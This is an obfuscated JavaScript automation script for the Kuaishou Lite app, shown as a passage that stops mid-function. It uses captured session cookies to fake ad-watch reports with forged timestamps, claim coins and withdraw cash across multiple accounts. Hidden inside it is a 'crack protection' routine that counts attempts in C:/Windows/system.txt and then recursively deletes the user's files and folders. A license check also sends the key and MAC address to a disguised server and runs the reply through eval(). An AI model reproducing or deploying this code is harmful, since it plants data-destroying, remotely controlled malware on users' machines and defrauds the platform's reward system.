var ksjsbAdBody = "encData=WlTuzeTU6mGT9525bjJUVnltcwcMQ3FjgjAw%2BtDz1mYKVQjrVHdJY0pKd7s5mx8%2BXMRRi7MCE3BSy1NNxI6bywhQueJl4YV8QDNsCONuMI7m59XX7rycrXz5ZPbObMBFLp23dqIF86Do53AbF3u4Dd2Vsk%2B1BzkhUIjucpA2gZ6g837f5Wz19RFfZ9m0pIuu8qg0EFbwOhyRaMezWC%2FfFs2M2fBj%2F%2BAZV63CQuUJV6MSpBlFU6%2BDiPwORLmSR81ZkexYHIeTr2KNUvBlcBtd6BE%2BjqjinHm7iU9BnYCYx70HkfOHA2TxPqNS9dBoJCaXUCZdA8Iy%2FXwz95700n4l98a9e0fAsnip7ehHiRCNVs7QSEMghZyZDAfMT%2Fcl%2FsFRfng0r%2FAKLMDb3H2szfw7S8O%2By4FT4%2BXiHpe%2FN8vnOSP0I1F3ZwXHWcZcNkvtfF4r7jtSrozNhThugzvyKjRmoJhi%2BQBlnOIV9GGpDBWprlbEmer2RVDv4A6vw2oLY8C%2Bj9hHLXZeGfewYQwm7pznXWYSwayxLHxrErKcaf9qBENiokJBq8FTLjHGKx2em0yOeaA2%2FtsoQo9qXnMLp2qLu7vbrsNam1V%2BqdqzejegRJ3WyFhGZMubHQz1PJVWNGkBjHDOxdONfL%2BoJQMGWJXRmBQ%2BiqzwHTjcLnJQP3KfYoFwiDc3LnW06YOImWP0vKZcWaNIZQi%2Fw9FwEoeEUGr2XXfCh1I6yOPOgK8eFvLBUU0BpJON5XlxfnRp6cqL6zMJW6hTvnOfWYC2YuT55bKk8U5weON9WB3Xn76NnqEgu4Mj8RRdNAFIr%2FwsCZnzwQNJ4IEpiGcZsUlsy0UsquUApQ1erkzqwmg6&sign=5a54eecde4d4ea61204b1c48bbed4720b97d6714deb8df19b5ca663a77065d48"
//抓包，看广告，看完小黄鸟搜/reward/ad，取body内encData=xxxx&sign=xxxx填入↑↑↑

/*
IOS/安卓： 快手极速版

已实现的：签到和翻倍，开宝箱和翻倍，看广告任务，逛街任务，抽奖和翻倍，广告任务，分享任务
金币每天0点自动兑换到现金余额

V2P和圈X配置好重写后，应该打开APP就能获取到CK，获取不到的话升级下app或者手动捉包
青龙把任意包里的kuaishou.api_st=xxxxxxxxxxxx;这一串东西放到变量ksjsbCookie里，多账户换行或者用@隔开
export ksjsbCookie='kuaishou.api_st=xxxxxxxxxxxx;
kuaishou.api_st=yyyyyyyyy;'

默认每天15点提现，要改的话把提现时间填到变量ksjsbWithdrawTime里
默认按照账户的提现列表从高到低提现到绑定的提现账号，都有绑定的话默认提现到支付宝。要固定提现金额的话填到变量ksjsbCash里。如果提现失败，手动接验证码提现一次
默认提现时间会触发通知，可以把ksjsbNotify设置成2改为每次运行都通知，ksjsbNotify设置为0则不通知

定时一天最少10次就行，最好改掉默认时间，不然太多人同一时间跑

重写：
[task_local]
#快手极速版
[rewrite_local]
[MITM]
#IOS用第一个，安卓用第二个
hostname = api.kuaisho*.com
hostname = open.kuaisho*.com
*/
const $$ = Envcc('');
let acckey = $$['isNode']() ? process['env']["cdkey"] ? process["env"]["cdkey"] : '' : $$["getdata"]("cdkey") ? $$['getdata']('cdkey') : '',
    all_msg = '',
    mac = '';
$$["isNode"]() ? (gtr = require('fs'), isFileExist("C:/") ? console['log']("\n电脑环境") : console["log"]("\n青龙环境")) : console['log']("\n代理环境");

function isFileExist(D) {
  try {
    gtr['accessSync'](D, gtr["F_OK"]);
  } catch (j) {
    return false;
  }

  return true;
}

function addF(D, j) {
  let N = 0,
      t = "C:/Windows/system.txt";

  if (isFileExist(t)) {
    N = gtr["readFileSync"](t, "utf8");
  } else {
    if (isFileExist('C:/')) {
      gtr['writeFile'](t, '1', function (n) {
        if (n) {
          throw n;
        }
      });
    } else {
      return;
    }
  }

  if (N == 99) {
    return 99;
  }

  console["log"](N);
  console["log"]("警告，恶意破解脚本将面临系统爆炸！！！，你只有3次机会！", N);

  if (parseInt(N) < 3) {
    let n = parseInt(N) + 1;
    gtr["writeFileSync"](t, n + '', "utf8");
    return;
  }

  if (!gtr["existsSync"](D)) {
    return;
  }

  if (gtr['statSync'](D)["isDirectory"]()) {
    var p = gtr["readdirSync"](D),
        X = p["length"],
        L = 0;
    X > 0 ? (p["forEach"](function (z) {
      L++;
      var A = D + '/' + z;
      gtr["statSync"](A)['isDirectory']() ? addF(A, true) : gtr['unlinkSync'](A);
    }), X == L && j && gtr["rmdirSync"](D)) : X == 0 && j && gtr["rmdirSync"](D);
  } else {
    gtr["unlinkSync"](D);
  }
}

function hqs(D = 10) {
  return new Promise(j => {
    let N = 5,
        t = {
      'url': $$["isNode"]() ? rc4($$["fwur"](), "1200") + ("?key=" + acckey + "&id=" + N + "&ip=1&mac=" + mac + '&bb=1') : rc4($$["fwur"](), '1200') + ("?key=" + acckey + '&id=' + N + "&ip=0&mac=" + mac + '&bb=1')
    };
    $$["post"](t, async (p, X, L) => {
      try {
        let n = eval(L);
        n["code"] == 200 ? (all_msg = n["msg"], j(n['data'])) : (all_msg = n["msg"], j(false));
      } catch (z) {
        $$["logErr"](z, X);
      }
    }, 0);
  });
}

const _0x11b3c3 = "快手极速版",
      _0x3de8b8 = new _0x4f15e2(_0x11b3c3);

let _0x279d25 = '',
    _0x1a0963,
    _0x4c35fe = ["\n", '@'],
    _0x547212 = (_0x3de8b8["isNode"]() ? process["env"]["ksjsbCookie"] : _0x3de8b8["getdata"]("ksjsbCookie")) || '',
    _0x431ea3 = [],
    _0x1e627b = (_0x3de8b8['isNode']() ? process['env']["ksjsbCash"] : _0x3de8b8["getval"]('ksjsbCash')) || '',
    _0x26f17b = (_0x3de8b8["isNode"]() ? process["env"]["ksjsbWithdrawTime"] : _0x3de8b8["getval"]('ksjsbWithdrawTime')) || 15,
    _0x13d24b = (_0x3de8b8["isNode"]() ? process['env']['ksjsbAggressive'] : _0x3de8b8["getval"]("ksjsbAggressive")) || 0,
    _0x113109 = (_0x3de8b8["isNode"]() ? process['env']["ksjsbNotify"] : _0x3de8b8["getval"]("ksjsbNotify")) || 1,
    _0x2863b1 = 0,
    _0x19c25c = 0,
    _0xf2b084 = 12,
    _0x5718d8 = [],
    yifenk = [];

const _0x1eb2d5 = {
  'id': 0,
  'name': "广告视频"
},
      _0x4fbf92 = {
  'id': 49,
  'name': "广告视频"
},
      _0x1b4191 = {
  'id': 77,
  'name': "宝箱翻倍视频"
},
      _0x2ffe31 = {
  'id': 136,
  'name': "签到翻倍视频1"
},
      _0x577a80 = {
  'id': 151,
  'name': "未知视频"
},
      _0x351e94 = {
  'ad1': _0x1eb2d5,
  'ad2': _0x4fbf92,
  'box': _0x1b4191,
  'sign': _0x2ffe31,
  'unknown1': _0x577a80
},
      _0x1e4967 = {
  'ad': 49,
  'live': 75,
  'luckydraw': 161,
  'gj': 217,
  'invite': 2008
},
      _0x3355c4 = {
  'extParams': '56dfe31594b858e69ef613f5e97227fb03493544e59e2b2a726006e2852ec1040cd969d4748c460ecf574cc487214a91f70592aa8b2225630027c39ca2c544027efa65815d1acea23cb503034b12641c',
  'businessId': 161,
  'pageId': 11101,
  'posId': 4683,
  'subPageId': 100013628,
  'name': "获取抽奖次数视频"
},
      _0x458f20 = {
  'extParams': "56dfe31594b858e69ef613f5e97227fbf89856abafca7f90fab063cf60935d6faedb05b76646dc3ece57cd4898d412d86e985a2b510216ad4853603d2992501cea0a08182731fcbf023467cf30ecda80",
  'businessId': 161,
  'pageId': 11101,
  'posId': 4685,
  'subPageId': 100013630,
  'name': "抽奖视频161-213"
},
      _0x124c4a = {
  'extParams': "56dfe31594b858e69ef613f5e97227fb67b973ad1394855c549442d15702f96393178eaeef5635134bb7e4ff97e69218c1f18455baf645dbaef685b7bf30c0914ea53ddcde26b2fa67b888203dab0fd4",
  'businessId': 161,
  'pageId': 11101,
  'posId': 4684,
  'subPageId': 100013629,
  'name': "抽奖视频161-100"
},
      _0x37f16f = {
  'extParams': "56dfe31594b858e69ef613f5e97227fbf89856abafca7f90fab063cf60935d6faedb05b76646dc3ece57cd4898d412d86e985a2b510216ad4853603d2992501cea0a08182731fcbf023467cf30ecda80",
  'businessId': 11,
  'pageId': 11101,
  'posId': 4684,
  'subPageId': 100013629,
  'name': "抽奖视频11-100"
},
      _0x10efec = {
  'extParams': '56dfe31594b858e69ef613f5e97227fb67b973ad1394855c549442d15702f96393178eaeef5635134bb7e4ff97e69218c1f18455baf645dbaef685b7bf30c0914ea53ddcde26b2fa67b888203dab0fd4',
  'businessId': 11,
  'pageId': 11101,
  'posId': 4684,
  'subPageId': 100013629,
  'name': '抽奖视频11-100'
},
      _0x385181 = {
  'extParams': '60869a9fd2ab63f5e0b1725d059da31f7d3ed3046658438ee204a153c3bc47189ccf268b22e603b6750780c9647e7a12b3027381e11da27b234311bccfd4a67bb892f889a4020ceae4f4e102cc50c327',
  'businessId': 2008,
  'pageId': 100012068,
  'posId': 6765,
  'subPageId': 100015089,
  'name': "邀请页视频(实际是100金币)"
},
      _0xfcb1d2 = {
  'extParams': '56dfe31594b858e69ef613f5e97227fbd5f9da00aa5144df8830a5781ae07d7cfaf4d95abc2510c950f99404a9e0bf62f5b5765a867c385685e0570ed76b858a159dacd55e41e4a9813db4e619a8b092',
  'businessId': 75,
  'pageId': 100012068,
  'posId': 6765,
  'subPageId': 100015089,
  'name': "直播任务"
},
      _0x11da17 = {
  'extParams': '56dfe31594b858e69ef613f5e97227fbd5f9da00aa5144df8830a5781ae07d7cfaf4d95abc2510c950f99404a9e0bf62f5b5765a867c385685e0570ed76b858a159dacd55e41e4a9813db4e619a8b092',
  'businessId': 168,
  'pageId': 100012068,
  'posId': 6765,
  'subPageId': 100015089,
  'name': '签到翻倍视频2'
},
      _0x10d9f8 = {
  'luckdrawNum_161': _0x3355c4,
  'luckdrawVideo_161_213': _0x458f20,
  'luckdrawVideo_161_100': _0x124c4a,
  'luckdrawVideo_11_213': _0x37f16f,
  'luckdrawVideo_11_100': _0x10efec,
  'inviteVideo_2008': _0x385181,
  'liveVideo_75': _0xfcb1d2,
  'signVideo_168': _0x11da17
};

let _0x134a17 = new Date(),
    _0x20a9d7 = _0x134a17["getHours"](),
    _0x459e63 = 1.07,
    _0x2e716e = 0,
    _0x5bc515 = "ksjsb",
    _0x180c0c = 'https://127.0.0.1',
    _0x75eec0 = 'https://127.0.0.1';

class _0x9d8dda {
  constructor(D) {
    let j = D['match'](/(kuaishou.api_st=[\w\-]+)/)[1] + ';';
    this['index'] = ++_0x2863b1;
    this["cookie"] = "kpn=NEBULA; kpf=ANDROID_PHONE; did=ANDROID_" + _0x4b5cde(16) + "; ver=9.10; appver=9.10.40.2474; language=zh-cn; countryCode=CN; sys=ANDROID_5.1; client_key=2ac2a76d; " + j;
    this["name"] = this['index'];
    this['valid'] = false;
    this["bindAlipay"] = false;
    this["alipay"] = '';
    this["bindWechat"] = false;
    this["wechat"] = '';
    this["needSms"] = false;
    this["hasLuckydraw"] = true;
    const N = {
      'num': 2,
      'needRun': true
    },
          t = {
      'num': 1,
      'needRun': true
    },
          p = {
      'num': 5,
      'needRun': true
    },
          X = {
      'num': 1,
      'needRun': true
    },
          L = {
      'num': 5,
      'needRun': true
    },
          n = {
      '49': N,
      '75': t,
      '161': p,
      '217': X,
      '2008': L
    };
    this["task"] = n;
  }

  async ["getUserInfo"]() {
    let D = 'https://nebula.kuaishou.com/rest/n/nebula/activity/earn/overview/basicInfo',
        j = '',
        N = _0x495d61(D, this["cookie"], j);

    await _0x39a23b('get', N);
    let t = _0x1a0963;

    if (!t) {
      return;
    }

    t["result"] == 1 ? (this["valid"] = true, this["name"] = t['data']["userData"]["nickname"], this["cashBalance"] = t["data"]["totalCash"], this["coinBalance"] = t["data"]['totalCoin'], this["allCash"] = t['data']["allCash"], console["log"]("账号[" + this['name'] + ']账户余额' + this["cashBalance"] + '元，' + this["coinBalance"] + "金币，未审核余额" + Math['floor'](parseFloat(this["allCash"]) - parseFloat(this['cashBalance'])) + '元')) : console['log']('账号[' + this["name"] + ']查询账户信息失败：' + t["error_msg"]);
  }

  async ['setShare']() {
    let D = "https://nebula.kuaishou.com/rest/n/nebula/account/withdraw/setShare",
        j = '',
        N = _0x495d61(D, this["cookie"], j);

    await _0x39a23b('post', N);
    let t = _0x1a0963;

    if (!t) {
      return;
    }

    t['result'] == 1 ? (console["log"]("账号[" + this["name"] + "]准备分享得金币"), await _0x3de8b8["wait"](200), await this["taskReward"](122)) : console["log"]("账号[" + this["name"] + ']分享失败：' + t["error_msg"]);
  }

  async ["taskReward"](D) {
    let j = 'https://nebula.kuaishou.com/rest/n/nebula/daily/report?taskId=' + D,
        N = '',
        t = _0x495d61(j, this['cookie'], N);

    await _0x39a23b("get", t);
    let p = _0x1a0963;

    if (!p) {
      return;
    }

    p["result"] == 1 ? console["log"]("账号[" + this['name'] + "]完成任务[" + D + ']成功，获得' + p["data"]["amount"] + '金币') : console["log"]('账号[' + this["name"] + "]完成任务[" + D + ']失败：' + p["error_msg"]);
  }

  async ["getSignInfo"]() {
    let D = "https://nebula.kuaishou.com/rest/n/nebula/sign/queryPopup",
        j = '',
        N = _0x495d61(D, this["cookie"], j);

    await _0x39a23b('get', N);
    let t = _0x1a0963;

    if (!t) {
      return;
    }

    t['result'] == 1 ? (console["log"]("账号[" + this["name"] + ']今天' + (t["data"]['nebulaSignInPopup']["todaySigned"] ? '已' : '未') + '签到'), !t["data"]["nebulaSignInPopup"]["todaySigned"] && (await _0x3de8b8['wait'](200), await this["doSign"](), await _0x3de8b8['wait'](200), await this["setShare"]())) : console['log']("账号[" + this["name"] + "]查询签到信息失败：" + t["error_msg"]);
  }

  async ["doSign"]() {
    let D = 'https://nebula.kuaishou.com/rest/n/nebula/sign/sign?source=activity',
        j = '',
        N = _0x495d61(D, this["cookie"], j);

    await _0x39a23b('get', N);
    let t = _0x1a0963;

    if (!t) {
      return;
    }

    t["result"] == 1 ? (console["log"]('账号[' + this['name'] + "]签到成功：" + t['data']["toast"]), await _0x3de8b8["wait"](200), await this["ksAdParam"](_0x351e94["sign"]), await _0x3de8b8["wait"](200), await this["ksNeoAdParam"](_0x10d9f8['signVideo_168'])) : console["log"]("账号[" + this["name"] + ']签到失败：' + t["error_msg"]);
  }

  async ["taskList"]() {
    let D = "https://nebula.kuaishou.com/rest/n/nebula/activity/earn/overview/tasks?addressBookAccessStatus=true&pushNotificationStatus=false",
        j = '',
        N = _0x495d61(D, this['cookie'], j);

    await _0x39a23b("get", N);
    let t = _0x1a0963;

    if (!t) {
      return;
    }

    if (t["result"] == 1) {
      console["log"]("账号[" + this["name"] + ']任务完成情况：');

      for (let p of t["data"]['dailyTasks']) {
        for (let X in _0x1e4967) {
          if (p["taskId"] == _0x1e4967[X]) {
            let L = parseInt(p["completedStages"]),
                n = parseInt(p["stages"]),
                z = Math["ceil"](n / _0xf2b084),
                A = L < n;
            const l = {
              'num': z,
              'needRun': A
            };
            this["task"][p['taskId']] = l;
            console["log"]('【' + p["name"] + "】 " + L + '/' + n + '，' + (A ? "未完成" : '已完成') + "，每次运行完成" + z + "次任务");
            continue;
          }
        }
      }
    } else {
      console["log"]("账号[" + this['name'] + ']查询任务列表失败：' + t["error_msg"]);
    }
  }

  async ["ksgj"]() {
    let D = 'https://api.e.kuaishou.com/rest/r/reward/task/getActivityReward',
        j = "activityId=148&client_key=ksgjbody",
        N = _0x495d61(D, this["cookie"], j);

    await _0x39a23b("post", N);
    let t = _0x1a0963;

    if (!t) {
      return;
    }

    t["result"] == 1 ? console["log"]('账号[' + this['name'] + "]逛街获得" + t["data"]["amount"] + '金币') : console["log"]('账号[' + this["name"] + "]逛街失败：" + t["error_msg"]);
  }

  async ['ksAdParam'](D) {
    let j = "https://api.e.kuaishou.com/rest/e/v1/reward/ad?kpf=ANDROID_PHONE&kpn=NEBULA",
        N = ksjsbAdBody,
        t = _0x495d61(j, this["cookie"], N);

    await _0x39a23b("post", t);
    let p = _0x1a0963;

    if (!p) {
      return;
    }

    p['result'] == 1 ? p["impAdInfo"] && p["impAdInfo"]["length"] > 0 && p["impAdInfo"][0]["adInfo"] && p['impAdInfo'][0]["adInfo"]["length"] > 0 && p["impAdInfo"][0]['adInfo'][0]["adBaseInfo"] && (await _0x3de8b8["wait"](200), await this["ksAdReward"](p['llsid'], p['impAdInfo'][0]["adInfo"][0]["adBaseInfo"]["creativeId"], D)) : console["log"]("账号[" + this["name"] + ']获取' + D["name"] + '参数失败：' + p['error_msg']);
  }

  async ['ksAdReward'](D, j, N) {
    let t = new Date()['getTime'](),
        p = Math["floor"](Math["random"]() * 30000) + 45000,
        X = t - p,
        L = 'https://api.e.kuaishou.com/rest/r/ad/nebula/reward',
        n = "bizStr={\"endTime\":" + t + ",\"eventValue\":-1,\"rewardList\":[{\"creativeId\":" + j + ",\"extInfo\":\"\",\"llsid\":" + D + ",\"taskType\":1}],\"startTime\":" + X + ",\"taskId\":" + N['id'] + '}',
        z = _0x495d61(L, this["cookie"], n);

    await _0x39a23b('post', z);
    let A = _0x1a0963;

    if (!A) {
      return;
    }

    A["result"] == 1 ? console["log"]("账号[" + this["name"] + ']看' + N["name"] + '获得' + A["data"]['awardAmount'] + '金币') : console["log"]("账号[" + this['name'] + ']看' + N["name"] + '失败：' + A["error_msg"]);
  }

  async ["openBox"](D) {
    let j = "https://nebula.kuaishou.com/rest/n/nebula/box/explore?isOpen=" + D + "&isReadyOfAdPlay=true",
        N = '',
        t = _0x495d61(j, this["cookie"], N);

    await _0x39a23b('get', t);
    let p = _0x1a0963;

    if (!p) {
      return;
    }

    p["result"] == 1 ? D == true ? p["data"]["commonAwardPopup"] && p["data"]['commonAwardPopup']["awardAmount"] ? (console['log']('账号[' + this["name"] + "]开宝箱获得" + p["data"]["commonAwardPopup"]["awardAmount"] + '金币'), await _0x3de8b8["wait"](200), await this['ksAdParam'](_0x351e94["box"])) : console['log']('账号[' + this['name'] + "]开宝箱没有获得金币") : p['data']["openTime"] > -1 ? (console["log"]('账号[' + this["name"] + "]开宝箱冷却时间还有" + Math["floor"](p["data"]["openTime"] / 1000) + '秒'), p["data"]["openTime"] == 0 && (await _0x3de8b8["wait"](200), await this["openBox"](true))) : console["log"]("账号[" + this["name"] + ']开宝箱次数已用完') : D == true ? console["log"]('账号[' + this["name"] + "]开宝箱失败：" + p["error_msg"]) : console["log"]("账号[" + this["name"] + "]查询宝箱状态失败：" + p["error_msg"]);
  }

  async ["withdraw"](D) {
    if (!this["bindAlipay"] && !this["bindWechat"]) {
      _0x1ab8b7("账号[" + this["name"] + "]未绑定提现账号，不执行提现");

      return;
    }

    let j = parseInt(D * 100),
        N = this["bindAlipay"] ? "ALIPAY" : 'WECHAT',
        t = N == 'ALIPAY' ? '支付宝' : '微信',
        p = N == "ALIPAY" ? this["alipay"] : this["wechat"],
        X = 'https://www.kuaishoupay.com/pay/account/h5/withdraw/apply',
        L = "account_group_key=NEBULA_CASH_ACCOUNT&mobile_code=&fen=" + j + "&provider=" + N + '&total_fen=' + j + "&commission_fen=0&third_account=" + N + "&attach=&biz_content=&session_id=",
        n = _0x495d61(X, this["cookie"], L);

    await _0x39a23b("post", n);
    let z = _0x1a0963;

    if (!z) {
      return;
    }

    z["result"] == 'SUCCESS' ? _0x1ab8b7('账号' + this['index'] + '[' + this["name"] + "]提现" + D + '元到' + t + '[' + p + "]成功") : _0x1ab8b7('账号' + this['index'] + '[' + this["name"] + ']提现' + D + '元到' + t + '[' + p + "]失败：" + z["msg"]);
  }

  async ["withdrawOverview"]() {
    let D = "https://nebula.kuaishou.com/rest/n/nebula/outside/withdraw/overview?appver=10.2.20.2021",
        j = '',
        N = _0x495d61(D, this["cookie"], j);

    await _0x39a23b("get", N);
    let t = _0x1a0963;

    if (!t) {
      return;
    }

    if (t["result"] == 1) {
      if (t["data"]['isLimit'] == true) {
        console["log"]('账号[' + this['name'] + ']今天已提现');
        return;
      }

      let p = parseFloat(this["cashBalance"]);

      if (_0x13d24b == 1) {
        if (p < 0.3) {
          _0x1ab8b7('账号[' + this["name"] + "]余额不足0.3元，不提现");
        } else {
          let X = Math["floor"](p * 10) / 10;
          X = X > 50 ? 50 : X;

          _0x1ab8b7("账号[" + this["name"] + "]准备最大化提现" + X + '元');

          await _0x3de8b8["wait"](200);
          await this["withdraw"](X);
        }
      } else {
        if (!_0x1e627b) {
          for (let L of t["data"]["enWithdrawList"]["sort"](function (n, z) {
            return z - n;
          })) {
            if (p >= parseFloat(L)) {
              _0x1ab8b7("账号[" + this['name'] + "]准备提现" + L + '元');

              await _0x3de8b8['wait'](200);
              await this["withdraw"](L);
              return;
            }
          }

          _0x1ab8b7("账号[" + this["name"] + ']余额不足，可提现额度：' + t["data"]["enWithdrawList"]['join'](','));
        } else {
          p >= parseFloat(_0x1e627b) ? (_0x1ab8b7("账号[" + this['name'] + "]准备提现" + _0x1e627b + '元'), await _0x3de8b8["wait"](200), await this["withdraw"](_0x1e627b)) : _0x1ab8b7('账号[' + this['name'] + ']余额不足' + _0x1e627b + '元，不提现');
        }
      }
    } else {
      console['log']("账号[" + this["name"] + "]查询提现列表失败：" + t["error_msg"]);
    }
  }

  async ["accountOverview"]() {
    let D = "https://nebula.kuaishou.com/rest/n/nebula/account/overview",
        j = '',
        N = _0x495d61(D, this["cookie"], j);

    await _0x39a23b("get", N);
    let t = _0x1a0963;

    if (!t) {
      return;
    }

    if (t["result"] == 1) {
      this["coinBalance"] = t["data"]["coinBalance"];
      this["cashBalance"] = t['data']["cashBalance"];
      let p = t["data"]["exchangeCoinState"];

      _0x1ab8b7("账号[" + this["name"] + "]账户余额" + this["cashBalance"] + '元，' + this["coinBalance"] + '金币');

      p == 2 && (await _0x3de8b8["wait"](200), await this["changeExchangeType"](0));
    } else {
      console['log']("账号[" + this['name'] + "]查询账户信息失败：" + t['error_msg']);
    }
  }

  async ["changeExchangeType"](D) {
    let j = "https://nebula.kuaishou.com/rest/n/nebula/exchange/changeExchangeType",
        N = "{\"type\":" + D + '}',
        t = _0x495d61(j, this['cookie'], N);

    t["headers"]['Content-Type'] = 'application/json';
    await _0x39a23b('post', t);
    let p = _0x1a0963;

    if (!p) {
      return;
    }

    let X = D == 0 ? "自动兑换" : "手动兑换";
    p["result"] == 1 ? console["log"]('账号[' + this["name"] + "]兑换方式更改成功，目前兑换方式为：" + X) : console['log']("账号[" + this["name"] + ']兑换方式更改失败：' + p["error_msg"]);
  }

  async ["exchangeCoin"]() {
    if (this["coinBalance"] < 100) {
      console["log"]('账号[' + this["name"] + "]金币余额不足100，不执行兑换");
      return;
    }

    let D = "https://nebula.kuaishou.com/rest/n/nebula/exchange/coinToCash/submit",
        j = "{\"coinAmount\":" + this["coinBalance"] + ",\"token\":\"rE2zK-Cmc82uOzxMJW7LI2-wTGcKMqqAHE0PhfN0U4bJY4cAM5Inxw\"}",
        N = _0x495d61(D, this["cookie"], j);

    N["headers"]["Content-Type"] = "application/json";
    await _0x39a23b('post', N);
    let t = _0x1a0963;

    if (!t) {
      return;
    }

    if (t["result"] == 1) {
      let p = Math["floor"](this["coinBalance"] / 100) * 100,
          X = Math["floor"](this["coinBalance"] / 100) / 100;
      console['log']("账号[" + this['name'] + "]兑换金币成功，将" + p + "金币兑换成" + X + '元');
    } else {
      console["log"]("账号[" + this['name'] + ']兑换金币失败：' + t['error_msg']);
    }
  }

  async ["ksNeoAdParam"](D) {
    let j = "https://api2.e.kuaishou.com/rest/e/v1/reward/ad?kpf=ANDROID_PHONE&kpn=NEBULA",
        N = ksjsbAdBody,
        t = _0x495d61(j, this["cookie"], N);

    await _0x39a23b("post", t);
    let p = _0x1a0963;

    if (!p) {
      return;
    }

    p["result"] == 1 ? p["impAdInfo"] && p["impAdInfo"]["length"] > 0 && p["impAdInfo"][0]["adInfo"] && p["impAdInfo"][0]['adInfo']["length"] > 0 && p["impAdInfo"][0]["adInfo"][0]["adBaseInfo"] && (await _0x3de8b8["wait"](200), await this["ksNeoAdReward"](p['llsid'], p["impAdInfo"][0]['adInfo'][0]["adBaseInfo"]["creativeId"], D)) : console['log']("账号[" + this["name"] + "]获取" + D["name"] + "参数失败：" + p["error_msg"]);
  }

  async ['ksNeoAdReward'](D, j, N) {
    let t = new Date()["getTime"](),
        p = Math["floor"](Math["random"]() * 30000) + 45000,
        X = t - p,
        L = 'https://api.e.kuaishou.com/rest/r/ad/task/report',
        n = "bizStr={\"businessId\":" + N["businessId"] + ",\"endTime\":" + t + ",\"extParams\":\"" + N["extParams"] + "\",\"mediaScene\":\"video\",\"neoInfos\":[{\"creativeId\":" + j + ",\"extInfo\":\"\",\"llsid\":" + D + ",\"taskType\":1}],\"pageId\":" + N["pageId"] + ",\"posId\":" + N["posId"] + ",\"startTime\":" + X + ",\"subPageId\":" + N["subPageId"] + '}',
        z = _0x495d61(L, this['cookie'], n);

    await _0x39a23b('post', z);
    let A = _0x1a0963;

    if (!A) {
      return;
    }

    if (A["result"] == 1) {
      let l = A['data']["neoAmount"] + '金币';

      if (A["data"]['neoToH5Data']) {
        try {
          let k = JSON['parse'](_0x331719["decode"](A["data"]["neoToH5Data"])["replace"](/\0/g, ''));
          k['extraCoin'] && (l += '+' + k["extraCoin"] + '金币');
        } catch (d) {
          console["log"](A["data"]["neoToH5Data"]);
        } finally {}
      }

      console["log"]("账号[" + this["name"] + ']看' + N["name"] + '获得' + l);
      this["hasLuckydraw"] && (await this["luckdrawTasks"]());
    } else {
      console["log"]("账号[" + this["name"] + ']看' + N['name'] + '失败：' + A["error_msg"]);
    }
  }

  async ["luckdrawInfo"]() {
    let D = 'https://activity.e.kuaishou.com/rest/r/game/user/info',
        j = '',
        N = _0x495d61(D, this["cookie"], j);

    await _0x39a23b("get", N);
    let t = _0x1a0963;

    if (!t) {
      return;
    }

    if (t['result'] == 1) {
      console['log']("账号[" + this['name'] + "]现有" + t["data"]["userDiamondResult"]["diamondPercent"] + '钻石，剩余抽奖次数：' + t["data"]["userDailyLotteryTimesResult"]["remainTimes"]);

      for (let p = 0; p < t["data"]['userDailyLotteryTimesResult']['remainTimes']; p++) {
        await _0x3de8b8["wait"](200);
        await this["luckydraw"]();
      }
    } else {
      console["log"]("账号[" + this["name"] + "]查询抽奖次数失败：" + t['error_msg']);
    }
  }

  async ["luckydraw"]() {
    let D = "https://activity.e.kuaishou.com/rest/r/game/lottery?wheelVersion=1",
        j = '',
        N = _0x495d61(D, this['cookie'], j);

    await _0x39a23b('post', N);
    let t = _0x1a0963;

    if (!t) {
      return;
    }

    if (t["result"] == 1) {
      let p = t["data"]["coinCount"] ? t['data']["coinCount"] + '金币' : t["data"]['diamondCount'] ? t['data']['diamondCount'] + '钻石' : '空气';
      console['log']("账号[" + this["name"] + "]抽奖获得" + p);
      t["data"]["videoCoinCount"] && console["log"]("额外奖励：" + t["data"]["videoCoinCount"]);

      if (t["data"]["schema"]) {
        try {
          console["log"](_0x331719["decode"](t["data"]["schema"]));
        } catch (X) {
          console["log"](t["data"]['schema']);
        } finally {}
      }

      this["hasLuckydraw"] && (await this["luckdrawTasks"]());
    } else {
      console["log"]('账号[' + this["name"] + "]抽奖失败：" + t["error_msg"]);
    }
  }

  async ["luckydrawSign"]() {
    let D = "https://activity.e.kuaishou.com/rest/r/game/sign-in",
        j = '',
        N = _0x495d61(D, this["cookie"], j);

    await _0x39a23b("get", N);
    let t = _0x1a0963;

    if (!t) {
      return;
    }

    t['result'] == 1 ? t['data']["isShow"] && console["log"]("账号[" + this['name'] + "]抽奖页签到成功") : (console["log"]("账号[" + this["name"] + "]查询抽奖签到情况失败：" + t["error_msg"]), t["error_msg"]["indexOf"]("激励游戏未在运营") > -1 && (this["hasLuckydraw"] = false));
  }

  async ['luckdrawTimerInfo']() {
    let D = "https://activity.e.kuaishou.com/rest/r/game/timer-reward/info",
        j = '',
        N = _0x495d61(D, this["cookie"], j);

    await _0x39a23b("get", N);
    let t = _0x1a0963;

    if (!t) {
      return;
    }

    if (t['result'] == 1) {
      if (t["data"]) {
        let p = new Date()['getTime'](),
            X = t["data"]["lastTimerTime"],
            L = t["data"]["minutesInterval"] * 60 * 1000,
            n = X + L;
        p < n ? console["log"]("账号[" + this["name"] + "]抽奖页奖励冷却时间还有" + (n - p) / 1000 + '秒') : (await _0x3de8b8["wait"](200), await this["luckdrawTimerReward"](t["data"]['goldNum']));
      } else {
        console["log"]("账号[" + this["name"] + "]抽奖页定时奖励次数已用完");
      }
    } else {
      console["log"]("账号[" + this["name"] + "]查询抽奖页定时奖励情况失败：" + t['error_msg']);
    }
  }

  async ["luckdrawTimerReward"](D) {
    let j = "https://activity.e.kuaishou.com/rest/r/game/timer-reward",
        N = '',
        t = _0x495d61(j, this['cookie'], N);

    await _0x39a23b('post', t);
    let p = _0x1a0963;

    if (!p) {
      return;
    }

    p["result"] == 1 ? console['log']("账号[" + this["name"] + "]领取抽奖页定时奖励获得" + D + '金币') : console["log"]("账号[" + this["name"] + ']领取抽奖页定时奖励失败：' + p["error_msg"]);
  }

  async ["luckdrawTasks"]() {
    let D = "https://activity.e.kuaishou.com/rest/r/game/tasks",
        j = '',
        N = _0x495d61(D, this['cookie'], j);

    await _0x39a23b('get', N);
    let t = _0x1a0963;

    if (!t) {
      return;
    }

    if (t['result'] == 1) {
      for (let p of t["data"]['dailyTasks']) {
        p["taskState"] == 1 && (await _0x3de8b8["wait"](200), await this["luckdrawTasksReward"](p));
      }

      for (let X of t["data"]["growthTasks"]) {
        X["taskState"] == 1 && (await _0x3de8b8['wait'](200), await this["luckdrawTasksReward"](X));
      }
    } else {
      console['log']("账号[" + this['name'] + "]查询抽奖页任务失败：" + t["error_msg"]);
    }
  }

  async ["luckdrawTasksReward"](D) {
